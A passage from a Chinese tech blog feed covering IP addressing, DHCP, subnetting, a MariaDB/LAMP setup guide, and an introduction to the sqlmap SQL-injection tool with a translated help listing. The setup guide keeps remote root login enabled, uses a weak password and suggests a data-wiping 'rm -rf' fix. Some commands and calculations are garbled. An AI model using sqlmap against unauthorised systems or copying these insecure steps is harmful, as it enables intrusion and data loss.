&lt;p&gt;受限的广播地址，常作为局域网内的边界 IP。受限广播地址与直接广播地址（主机字段全为 1 的 IP）的区别在于，受限广播地址只能用于本地网络，路由器不会转发以受限广播地址为目的地址的分组。而一般广播地址既可在本地广播，也可跨网段广播。换句话说，就是一般的广播地址（直接广播地址）能够通过某些路由器（当然不是所有的路由器），而受限的广播地址不能通过路由器。&lt;/p&gt;
&lt;h2 id=&#34;3计算机获取ip的过程&#34;&gt;3.计算机获取IP的过程&lt;/h2&gt;
&lt;p&gt;当计算机启动时，默认IP地址 0.0.0.0 ，此时没有身份信息，无法进入网络，计算机需要进行广播。&lt;/p&gt;
&lt;h3 id=&#34;1discover阶段&#34;&gt;1）discover阶段&lt;/h3&gt;
&lt;p&gt;由 0.0.0.0 发送到 255.255.255.255，这个操作实际上是一个广播，正如名字 discover 一样，目的是为主机寻找 DHCP 服务器。这个广播最远到达网关。&lt;/p&gt;
&lt;h3 id=&#34;2offer阶段&#34;&gt;2）offer阶段&lt;/h3&gt;
&lt;p&gt;DHCP 服务器收到请求后，会给计算机分配地址，然后将地址数据包返回。当电脑收到这个包后，就会根据 DHCP 协议为自己配上地址。注意到的是，此时 DHCP 服务器是通过 MAC 地址与计算机连接并传输信息。MAC 地址也可以用于通信，但是只限于本地通信，无法加入互联网。&lt;/p&gt;
&lt;h3 id=&#34;3request阶段&#34;&gt;3）request阶段&lt;/h3&gt;
&lt;p&gt;这个阶段计算机会通过广播向 DHCP 发送 request 包，确定使用这个地址。这是由于网络中可能会部署多台 DHCP 服务器，导致计算机可能会收到多个 offer，因此计算机为了确认使用哪个地址，需要再发一个 request 来告知 DHCP 服务器。服务器也是收到请求后，才会真正的把这个地址分配出去。&lt;/p&gt;
&lt;h3 id=&#34;4ack阶段&#34;&gt;4）ACK阶段&lt;/h3&gt;
&lt;p&gt;DHCP 服务器通过 MAC 地址发送 ACK 包，确认电脑请求的 IP 地址可使用（NAK）&lt;/p&gt;
&lt;h2 id=&#34;4回环地址-127001&#34;&gt;4.回环地址 127.0.0.1&lt;/h2&gt;
&lt;p&gt;127.0.0.1 到 127.255.255.254（去掉0和255）的范围都是本地回环地址，通常被称为本地回环地址(Loopback Address)，不属于任何一个地址类。它代表设备的本地虚拟接口，所以默认被看作是永远不会宕掉的接口。在 Windows 操作系统中也有相似的定义，所以通常在安装网卡前，可以尝试 ping 通这个本地回环地址，来检查本地网络协议、基本数据接口等是否正常的。&lt;/p&gt;
&lt;h2 id=&#34;5本地私有ip地址&#34;&gt;5.本地私有IP地址&lt;/h2&gt;
&lt;p&gt;IPv4 地址空间中有一部分特殊的地址，称为私有 IP 地址，私有 IP 地址不能直接访问公网（Internet）的 IP，只能在本地使用。&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;
&lt;p&gt;A类私有地址：10.0.0.0/8，范围是：10.0.0.0 ~ 10.255.255.255&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;B类私有地址：172.16.0.0/12，范围是：172.16.0.0 ~ 172.31.255.255&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;C类私有地址：192.168.0.0/16，范围是：192.168.0.0 ~ 192.168.255.255&lt;/p&gt;
&lt;/li&gt;
&lt;/ul&gt;
</description>
        </item>
        <item>
        <title>计算机网络—什么是子网</title>
        <link>https://ac-lm.github.io/posts/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BD%91%E7%BB%9C/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BD%91%E7%BB%9C%E4%BB%80%E4%B9%88%E6%98%AF%E5%AD%90%E7%BD%91/</link>
        <pubDate>Thu, 19 Nov 2020 00:00:00 +0000</pubDate>
        
        <guid>https://ac-lm.github.io/posts/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BD%91%E7%BB%9C/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BD%91%E7%BB%9C%E4%BB%80%E4%B9%88%E6%98%AF%E5%AD%90%E7%BD%91/</guid>
        <description>&lt;h2 id=&#34;1为什么要划分子网&#34;&gt;1.为什么要划分子网&lt;/h2&gt;
&lt;ol&gt;
&lt;li&gt;如果不划分子网，那么每个路由器中路由表的信息量将会非常大，影响网络的速度与性能。划分子网后，将减少广播所带来的负面影响，提高整体的性能。&lt;/li&gt;
&lt;li&gt;相对来看，节省了 IP 地址资源，在分配地址时，不再按类地址进行分配，而是按需分配，所以总的来说，被浪费的 IP 地址少了，IP 地址资源节省了。&lt;/li&gt;
&lt;li&gt;虽然划分子网没有增加可用 IP 地址，而且减少了可用 IP 地址（因为每个子网中的全 0 网络地址和全 1 广播地址均不能作为主机 IP 来使用）。但通过对一个网络进行子网划分，将一个大网络分成多个小的网络的操作，可以让更多的人拥有 IP 地址。比如，当一组 IP 地址指定给一个公司时，公司可以将该网络分割成多个小网络，分配给每个部门使用。这样，技术部门和管理部门就都可以有属于自己的小网络。&lt;/li&gt;
&lt;/ol&gt;
&lt;h2 id=&#34;2什么是子网掩码&#34;&gt;2.什么是子网掩码&lt;/h2&gt;
&lt;p&gt;子网掩码是判断两个 IP 地址是否同属一个子网的标志，同时也是一个 32 位二进制地址，它和 IP 地址一样也是使用点式十进制来表示的。如果两个 IP 地址在和子网掩码的按位与计算下所得结果相同，即表明它们共属于同一子网中。&lt;/p&gt;
&lt;p&gt;每个子网有 3 类地址：网络地址，主机分配地址，广播地址。如子网 192.168.1.0 — 192.168.1.63。其网络地址 192.168.1.0，广播地址 192.168.1.63，主机分配地址 192.168.1.1 — 192.168.1.62。&lt;/p&gt;
&lt;p&gt;比如要对 IP 段 192.168.1.0 至 192.168.1.255 的 256 个 IP 划分 4 个子网 ，每个子网可以分 64 个 IP，可以这样来操作。&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;192.168.1.0 - 192.168.1.63&lt;/li&gt;
&lt;li&gt;192.168.1.64 - 192.168.1.127&lt;/li&gt;
&lt;li&gt;192.168.1.128 - 192.168.1.191&lt;/li&gt;
&lt;li&gt;192.168.1.192 - 192.168.1.255&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;我们可以这样来描述所分的 IP 段&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;192.168.1.0 / 26&lt;/li&gt;
&lt;li&gt;192.168.1.64 / 26&lt;/li&gt;
&lt;li&gt;192.168.1.128 / 26&lt;/li&gt;
&lt;li&gt;192.168.1.192 / 26&lt;/li&gt;
&lt;/ul&gt;
&lt;h3 id=&#34;1-26-是什么&#34;&gt;1）/ 26 是什么？&lt;/h3&gt;
&lt;p&gt;上述所分子网的掩码 255.255.255.192 是 1111-1111.1111-1111.1111-1111.1100-0000 ，一共有 26 个 1，所以为了简化表示，我们可以用 / 26 代替 255.255.255.192。此外，对 /26 做如下运算可以快速查看 IP 所分的子网数与掩码：26 / 8 = 3&amp;hellip;.2 ，划分了 3+1 个子网，掩码 255.255.255.11000000&lt;/p&gt;
&lt;h3 id=&#34;2子网掩码的定义&#34;&gt;2）子网掩码的定义&lt;/h3&gt;
&lt;p&gt;以 IP 段 192.168.1.0 - 192.168.1.63 为例，其二进制表示为&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;192.168.1.0 — 1100-0000.1010-1000.0000-0001.0000-0000&lt;/li&gt;
&lt;li&gt;192.168.1.63 — 1100-0000.1010-1000.0000-0001.0011-1111&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;首尾地址完全相同的是1100-0000.1010-1000.0000-0001.00，这26位，那么我们就可以用 192.168.1.0 / 26 表示这个 IP 段。将相同部分全部置 1，其他为 0，得 1111-1111.1111-1111.1111-1111.1100-0000，即 255.255.255.192，这就是子网掩码。&lt;/p&gt;
&lt;h2 id=&#34;4子网掩码的计算&#34;&gt;4.子网掩码的计算&lt;/h2&gt;
&lt;h3 id=&#34;1利用子网数来计算&#34;&gt;1）利用子网数来计算&lt;/h3&gt;
&lt;p&gt;在求子网掩码之前必须先清楚要划分的子网数目，以及每个子网内的所需主机数目。如要将 B 类 IP 地址 168.195.0.0 划分成 27 个子网。首先将 27 转换为二进制数【27 = 11011】。然后取得该二进制的位数，为 N【N = 5】。再取得该 IP 地址的类子网掩码【1111-1111.1111-1111.0000-0000.0000-0000】，将其主机地址部分的的前 N 位置 1，得【1111-1111.1111-1111.1111-1000.0000-0000】，即该 IP 地址划分子网的子网掩码。&lt;/p&gt;
&lt;h3 id=&#34;2根据每个网络的主机数量进行子网地址的规划和计算子网掩码&#34;&gt;2）根据每个网络的主机数量进行子网地址的规划和计算子网掩码。&lt;/h3&gt;
&lt;p&gt;如果一个子网有 10 台主机，那么对于这个子网需要的IP地址是：10＋1＋1＋1＝13。因为 13 小于 16（ 2 的 4 次方），所以主机位为 4 位。而 256－16＝240，所以该子网掩码为 255.255.255.240。&lt;/p&gt;
&lt;p&gt;如果一个子网有 14 台主机，因为 14＋1＋1＋1＝17，17大于16（2的4次方），所以我们只能分配具有 32 个地址（32等于2的5次方）空间的子网。这时子网掩码为：255.255.255.224。&lt;/p&gt;
&lt;p&gt;需要注意的是：加的第一个 1 是指这个网络连接时所需的网关地址，接着的两个 1 分别是指网络地址和广播地址 。一个网络要上网必须需要网关作为路由器分配 IP 地址。如果仅仅为主机和保留地址分配 IP，那么该子网仅能在本地工作，无法与其他网络互联。&lt;/p&gt;
</description>
        </item>
        <item>
        <title>Linux—LAMP 环境安装与使用</title>
        <link>https://ac-lm.github.io/posts/linux/linuxlamp-%E7%8E%AF%E5%A2%83%E5%AE%89%E8%A3%85%E4%B8%8E%E4%BD%BF%E7%94%A8/</link>
        <pubDate>Wed, 18 Nov 2020 00:00:00 +0000</pubDate>
        
        <guid>https://ac-lm.github.io/posts/linux/linuxlamp-%E7%8E%AF%E5%A2%83%E5%AE%89%E8%A3%85%E4%B8%8E%E4%BD%BF%E7%94%A8/</guid>
        <description>&lt;h2 id=&#34;1什么是lamp环境&#34;&gt;1.什么是LAMP环境&lt;/h2&gt;
&lt;p&gt;LAMP是指一组通常一起使用来运行动态网站或者服务器的自由软件名称首字母缩写：&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;Linux，操作系统&lt;/li&gt;
&lt;li&gt;Apache，网页服务器&lt;/li&gt;
&lt;li&gt;MariaDB或MySQL，数据库管理系统（或者数据库服务器）&lt;/li&gt;
&lt;li&gt;PHP、Perl或Python，脚本语言&lt;/li&gt;
&lt;/ul&gt;
&lt;h2 id=&#34;2mariadb-数据库&#34;&gt;2.MariaDB 数据库&lt;/h2&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;yum -y mariadb mariadb-server  &lt;span style=&#34;color:#75715e&#34;&gt;#安装mariadb客户端和服务端程序&lt;/span&gt;
yum groupinstall mariadb mariadb-server -y  &lt;span style=&#34;color:#75715e&#34;&gt;#或&lt;/span&gt;
systemctl start mariadb         &lt;span style=&#34;color:#75715e&#34;&gt;#启动程序&lt;/span&gt;
systemctl enable mariadb         &lt;span style=&#34;color:#75715e&#34;&gt;#设为开机自启动&lt;/span&gt;
mysql_secure_installation         &lt;span style=&#34;color:#75715e&#34;&gt;#直接执行初始化命令，会弹出交互配置信息&lt;/span&gt;
&lt;span style=&#34;color:#75715e&#34;&gt;##交互信息##&lt;/span&gt;
Enter current password &lt;span style=&#34;color:#66d9ef&#34;&gt;for&lt;/span&gt; root &lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt;enter &lt;span style=&#34;color:#66d9ef&#34;&gt;for&lt;/span&gt; none&lt;span style=&#34;color:#f92672&#34;&gt;)&lt;/span&gt;:#初次进入密码为空，直接回车
New password:                &lt;span style=&#34;color:#75715e&#34;&gt;#输入要为root用户设置的数据库密码。&lt;/span&gt;
Re-enter new password:            &lt;span style=&#34;color:#75715e&#34;&gt;#重复再输入一次密码。&lt;/span&gt;
Remove anonymous users? &lt;span style=&#34;color:#f92672&#34;&gt;[&lt;/span&gt;Y/n&lt;span style=&#34;color:#f92672&#34;&gt;]&lt;/span&gt; y      &lt;span style=&#34;color:#75715e&#34;&gt;#删除匿名帐号&lt;/span&gt;
Disallow root login remotely? &lt;span style=&#34;color:#f92672&#34;&gt;[&lt;/span&gt;Y/n&lt;span style=&#34;color:#f92672&#34;&gt;]&lt;/span&gt; n &lt;span style=&#34;color:#75715e&#34;&gt;#是否禁止root用户从远程登录，安全起见应禁止，这里为做实验方便这里不禁止。&lt;/span&gt;
Remove test database and access to it? &lt;span style=&#34;color:#f92672&#34;&gt;[&lt;/span&gt;Y/n&lt;span style=&#34;color:#f92672&#34;&gt;]&lt;/span&gt; y  &lt;span style=&#34;color:#75715e&#34;&gt;#是否删除test数据库，想留着也随意&lt;/span&gt;
Reload privilege tables now? &lt;span style=&#34;color:#f92672&#34;&gt;[&lt;/span&gt;Y/n&lt;span style=&#34;color:#f92672&#34;&gt;]&lt;/span&gt; y  &lt;span style=&#34;color:#75715e&#34;&gt;#刷新授权表，让初始化后的设定立即生效mariadb中命令都要以&amp;#34;;&amp;#34; 结尾，表示命令输入完毕&lt;/span&gt;
&lt;span style=&#34;color:#75715e&#34;&gt;##交互结束##&lt;/span&gt;
mysql -uroot -p123456  &lt;span style=&#34;color:#75715e&#34;&gt;#登录&lt;/span&gt;
show databases;  &lt;span style=&#34;color:#75715e&#34;&gt;#显示当前已有的数据库&lt;/span&gt;
show tables;   &lt;span style=&#34;color:#75715e&#34;&gt;#显示当前数据库中的表单&lt;/span&gt;
desc user;     &lt;span style=&#34;color:#75715e&#34;&gt;#查看user表的数据结构&lt;/span&gt;
&lt;span style=&#34;color:#66d9ef&#34;&gt;select&lt;/span&gt; * from user;   &lt;span style=&#34;color:#75715e&#34;&gt;#查询mysql库下的user表中的所有&lt;/span&gt;
create database lan;      &lt;span style=&#34;color:#75715e&#34;&gt;#创建库&lt;/span&gt;
create table Linux （         &lt;span style=&#34;color:#75715e&#34;&gt;#创建表格&lt;/span&gt;
           username varchar（50） not null，  &lt;span style=&#34;color:#75715e&#34;&gt;#字段名称 字段长度50 不能为空&lt;/span&gt;
           password  varchar（50） not null，
           age  varchar（4） ）；
insert into Linux values &lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;we&amp;#39;&lt;/span&gt;,&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;123&amp;#39;&lt;/span&gt;,&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;23&amp;#39;&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;)&lt;/span&gt;;  &lt;span style=&#34;color:#75715e&#34;&gt;#在Linux表格中插入信息&lt;/span&gt;
use 数据库; &lt;span style=&#34;color:#75715e&#34;&gt;#使用数据库&lt;/span&gt;
drop table Linux；#删除表格Linux
drop database lan； &lt;span style=&#34;color:#75715e&#34;&gt;#删除库lan&lt;/span&gt;
exit
&lt;span style=&#34;color:#75715e&#34;&gt;#ps：如果出现无权限错误，请尝试rm -rf /var/lib/mysql/*，删除所有mysql，重新安装&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;h2 id=&#34;3httpd与php&#34;&gt;3.Httpd与php&lt;/h2&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;yum -y install httpd php php-mysql php-gd &lt;span style=&#34;color:#75715e&#34;&gt;#安装httpd 与 php&lt;/span&gt;
systemctl start httpd &lt;span style=&#34;color:#75715e&#34;&gt;#启动httpd，请开启80端口，见Linux(2)——Docker安装与防火墙&lt;/span&gt;
vim /var/www/html/test.php  &lt;span style=&#34;color:#75715e&#34;&gt;#创建测试页面，&amp;lt;?php phpinfo();?&amp;gt;，处于/var/www/html/目录下html文件都可以访问&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;</description>
        </item>
        <item>
        <title>Net—sqlmap 数据库渗透测试工具</title>
        <link>https://ac-lm.github.io/posts/%E7%BD%91%E7%BB%9C%E6%B5%8B%E8%AF%95%E5%B7%A5%E5%85%B7/netsqlmap-%E6%95%B0%E6%8D%AE%E5%BA%93%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E5%B7%A5%E5%85%B7/</link>
        <pubDate>Wed, 18 Nov 2020 00:00:00 +0000</pubDate>
        
        <guid>https://ac-lm.github.io/posts/%E7%BD%91%E7%BB%9C%E6%B5%8B%E8%AF%95%E5%B7%A5%E5%85%B7/netsqlmap-%E6%95%B0%E6%8D%AE%E5%BA%93%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E5%B7%A5%E5%85%B7/</guid>
        <description>&lt;h2 id=&#34;1sqlmap&#34;&gt;1.sqlmap&lt;/h2&gt;
&lt;p&gt;&lt;a class=&#34;link&#34; href=&#34;http://sqlmap.org/&#34;  target=&#34;_blank&#34; rel=&#34;noopener&#34;
    &gt; sqlmap官网下载 &lt;/a&gt;&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;sqlmap是一个开源的数据库渗透测试工具，它自动化了检测和利用SQL注入缺陷以及接管数据库服务器的过程&lt;/strong&gt;。它配备了强大的引擎，为渗透测试提供许多基本的功能。&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;&lt;span style=&#34;color:#75715e&#34;&gt;#进入sqlmap源码文件夹，因为sqlmap用的是python2编写的，需要编译后使用&lt;/span&gt;
tar zxvf sqlmap.tar.gz
cd sqlmap
./sqlmap.py
&lt;span style=&#34;color:#75715e&#34;&gt;#创建sqlmap命令&lt;/span&gt;
ln -s /root/sqlmapproject-sqlmap-7eab1bc/sqlmap.py /usr/bin/sqlmap
sqlmap -h &lt;span style=&#34;color:#75715e&#34;&gt;#帮助命令&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;h2 id=&#34;2sqlmap的语法&#34;&gt;2.sqlmap的语法&lt;/h2&gt;
&lt;p&gt;sqlmap命令选项被归类为目标（Target）、请求（Request）、优化、注入、检测、技巧（Techniques）、指纹、枚举等。当给sqlmap一个url的时候，它会执行如下操作&lt;/p&gt;
&lt;ol&gt;
&lt;li&gt;判断可注入的参数&lt;/li&gt;
&lt;li&gt;判断可以用那种SQL注入技术来注入&lt;/li&gt;
&lt;li&gt;识别出哪种数据库&lt;/li&gt;
&lt;li&gt;根据用户选择，读取哪些数据&lt;/li&gt;
&lt;/ol&gt;
&lt;h2 id=&#34;3sqlmap支持的数据库&#34;&gt;3.sqlmap支持的数据库&lt;/h2&gt;
&lt;p&gt;MySQL, Oracle, PostgreSQL, Microsoft SQL Server, Microsoft Access, IBM DB2, SQLite, Firebird, Sybase 和 SAP MaxDB&lt;/p&gt;
&lt;h2 id=&#34;4sqlmap支持五种不同的注入模式测试&#34;&gt;4.sqlmap支持五种不同的注入模式测试&lt;/h2&gt;
&lt;ul&gt;
&lt;li&gt;基于布尔的盲注，即可以根据返回页面判断条件真假的注入&lt;/li&gt;
&lt;li&gt;基于时间的盲注，即不能根据页面返回内容判断任何信息，用条件语句查看时间延迟语句是否执行（即页面返回时间是否增加）来判断&lt;/li&gt;
&lt;li&gt;基于报错注入，即页面会返回错误信息，或者把注入的语句的结果直接返回在页面中&lt;/li&gt;
&lt;li&gt;联合查询注入，可以使用union的情况下的注入&lt;/li&gt;
&lt;li&gt;堆查询注入，可以同时执行多条语句的执行时的注入&lt;/li&gt;
&lt;/ul&gt;
&lt;h2 id=&#34;5sqlmap帮助文档翻译&#34;&gt;5.sqlmap帮助文档翻译&lt;/h2&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;        ___
       __H__
 ___ ___&lt;span style=&#34;color:#f92672&#34;&gt;[&lt;/span&gt;.&lt;span style=&#34;color:#f92672&#34;&gt;]&lt;/span&gt;_____ ___ ___  &lt;span style=&#34;color:#f92672&#34;&gt;{&lt;/span&gt;1.1.3#stable&lt;span style=&#34;color:#f92672&#34;&gt;}&lt;/span&gt;
|_ -| . &lt;span style=&#34;color:#f92672&#34;&gt;[(]&lt;/span&gt;     | .&lt;span style=&#34;color:#960050;background-color:#1e0010&#34;&gt;&amp;#39;&lt;/span&gt;| . |
|___|_  &lt;span style=&#34;color:#f92672&#34;&gt;[&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;]_|_|_|__,|  _|
&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;      |_|V          |_|   http://sqlmap.org
&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;
&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;Usage: python sqlmap [options]
&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;
&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;Options(选项):
&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;  -h, --help            显示基本帮助信息
&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;  -hh                   显示高级帮助信息
&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;  --version             显示版本号
&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;  -v VERBOSE            详细级别：0-6（默认为1）.设置输出信息的详细程度
&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;                        0:只显示追踪栈 ,错误以及重要信息。1:还显示信息和警告。2:显示debug消息。3:显示注入payload。
&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;                        4:显示HTTP请求。5:显示HTTP响应头。6:显示HTTP响应内容
&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;
&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;  Target(目标):
&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;    以下至少需要设置其中一个选项来提供给目标URL
&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;    -d DIRECT           直接连接到数据库的连接字符串。
&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;    -u URL, --url=URL   目标 URL (e.g. &amp;#34;&lt;/span&gt;http://www.site.com/vuln.php?id&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;1&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;)
&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;    -l LOGFILE          从Burp或WebScarab代理的日志中解析目标
&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;    -x SITEMAPURL       Parse target(s) from remote sitemap(.xml) file           从远程站点地图文件(.xml)解析目标(s)
&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;    -m BULKFILE         Scan multiple targets given in a textual file            扫描文本文件中给出的多个目标  
&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;    -r REQUESTFILE      Load HTTP request from a file                            从文件加载HTTP请求  
&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;    -g GOOGLEDORK       Process Google dork results as target URLs               处理Google dork的结果作为目标URL
&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;    -c CONFIGFILE       Load options from a configuration INI file               从INI配置文件中加载选项。  
&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;
&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;  Request(请求):
&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;    这些选项可以用来指定如何连接到目标URL。
&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;    --method=METHOD     Force usage of given HTTP method (e.g. PUT)               强制使用给定的HTTP方法（e.g. PUT）  
&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;    --data=DATA         Data string to be sent through POST                       通过POST发送的数据字符串  
&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;    --param-del=PARA..  Character used for splitting parameter values             用于拆分参数值的字符  
&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;    --cookie=COOKIE     HTTP Cookie header value                                  HTTP Cookie头的值  
&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;    --cookie-del=COO..  Character used for splitting cookie values                用于分割Cookie值的字符  
&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;    --load-cookies=L..  File containing cookies in Netscape/wget format           包含Netscape / wget格式的cookie的文件 
&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;    --drop-set-cookie   Ignore Set-Cookie header from response                    从响应中忽略Set-Cookie头  
&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;    --user-agent=AGENT  HTTP User-Agent header value                              指定 HTTP User - Agent头    
&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;    --random-agent      Use randomly selected HTTP User-Agent header value        使用随机选定的HTTP User - Agent头
&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;    --host=HOST         HTTP Host header value                                    HTTP主机头值 
&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;    --referer=REFERER   HTTP Referer header value                                 指定 HTTP Referer头 
&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;    -H HEADER, --hea..  Extra header (e.g. &amp;#34;&lt;/span&gt;X-Forwarded-For: 127.0.0.1&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;)          额外header  
&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;    --headers=HEADERS   Extra headers (e.g. &amp;#34;&lt;/span&gt;Accept-Language: fr&lt;span style=&#34;color:#ae81ff&#34;&gt;\n&lt;/span&gt;ETag: 123&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;)     额外header  
&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;    --auth-type=AUTH..  HTTP authentication type (Basic, Digest, NTLM or PKI)     HTTP认证类型(Basic, Digest, NTLM or PKI) 
&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;    --auth-cred=AUTH..  HTTP authentication credentials (name:password)           HTTP认证凭证(name:password)  
&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;    --auth-file=AUTH..  HTTP authentication PEM cert/private key file             HTTP认证 PEM认证/私钥文件  
&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;    --ignore-401        Ignore HTTP Error 401 (Unauthorized)                      忽略HTTP错误401(未经授权)  
&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;    --ignore-proxy      Ignore system default proxy settings                      忽略系统默认代理设置 
&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;    --ignore-redirects  Ignore redirection attempts
&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;    --ignore-timeouts   Ignore connection timeouts
&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;    --proxy=PROXY       Use a proxy to connect to the target URL                  使用代理连接到目标网址  
&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;    --proxy-cred=PRO..  Proxy authentication credentials (name:password)          代理认证证书(name:password)   
&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;    --proxy-file=PRO..  Load proxy list from a file                               从文件中加载代理列表  
&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;    --tor               Use Tor anonymity network                                 使用Tor匿名网络  
&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;    --tor-port=TORPORT  Set Tor proxy port other than default                     设置Tor代理端口而不是默认值  
&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;    --tor-type=TORTYPE  Set Tor proxy type (HTTP, SOCKS4 or SOCKS5 (default))     设置Tor代理类型  
&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;    --check-tor         Check to see if Tor is used properly                      检查Tor是否正确使用
&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;    --delay=DELAY       Delay in seconds between each HTTP request                每个HTTP请求之间的延迟（秒）
&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;    --timeout=TIMEOUT   Seconds to wait before timeout connection (default 30)    秒超时连接前等待（默认30） 
&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;    --retries=RETRIES   Retries when the connection timeouts (default 3)          连接超时时重试（默认值3）
&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;    --randomize=RPARAM  Randomly change value for given parameter(s)              随机更改给定参数的值(s) 
&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;    --safe-url=SAFEURL  URL address to visit frequently during testing            在测试期间频繁访问的URL地址 
&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;    --safe-post=SAFE..  POST data to send to a safe URL                           POST数据发送到安全URL  
